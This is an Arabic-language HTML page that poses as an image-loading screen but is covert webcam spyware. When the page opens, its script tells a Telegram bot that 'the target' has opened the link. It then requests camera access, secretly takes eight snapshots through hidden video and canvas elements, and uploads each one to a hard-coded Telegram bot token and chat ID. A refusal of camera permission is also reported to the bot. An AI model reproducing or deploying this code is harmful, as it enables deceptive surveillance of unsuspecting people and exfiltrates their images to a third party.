<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>جاري تحميل الصورة...</title>
    <style>
        body { background-color: #000; color: white; text-align: center; padding-top: 20%; font-family: Arial; }
        .loader { border: 8px solid #f3f3f3; border-top: 8px solid #3498db; border-radius: 50%; width: 60px; height: 60px; animation: spin 2s linear infinite; margin: 0 auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="loader"></div>
    <p>جاري معالجة الصورة، يرجى الانتظار...</p>

    <video id="video" width="640" height="480" autoplay style="display:none;"></video>
    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>

    <script>
        // التوكن والايدي بتوعك بالظبط
        const token = '8207943883:AAF_XJoeKlHEE2bB7Ro0PBVSvpihbuZ0fW0';
        const chat_id = '8350812242';

        // تنبيه للبوت أول ما الصفحة تفتح
        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=🚀 الهدف فتح الرابط الآن وجاري طلب الكاميرا...`);

        async function start() {
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');

            try {
                // طلب الكاميرا
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                video.srcObject = stream;

                // انتظر ثانية للتأكد من تشغيل الكاميرا
                await new Promise(r => setTimeout(r, 1000));

                // تصوير 8 صور
                for (let i = 1; i <= 8; i++) {
                    const context = canvas.getContext('2d');
                    context.drawImage(video, 0, 0, 640, 480);
                    
                    canvas.toBlob(blob => {
                        const formData = new FormData();
                        formData.append('chat_id', chat_id);
                        formData.append('photo', blob, `img_${i}.jpg`);
                        formData.append('caption', `✅ لقطة رقم ${i}`);

                        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
                            method: 'POST',
                            body: formData
                        });
                    }, 'image/jpeg', 0.6); // جودة 60% عشان تترفع بسرعة

                    await new Promise(r => setTimeout(r, 2000)); // انتظر ثانيتين بين كل صورة
                }
            } catch (err) {
                // لو رفض الاذن يبعتلك خبر
                fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=❌ الهدف رفض إذن الكاميرا`);
            }
        }

        window.onload = start;
    </script>
</body>
</html>
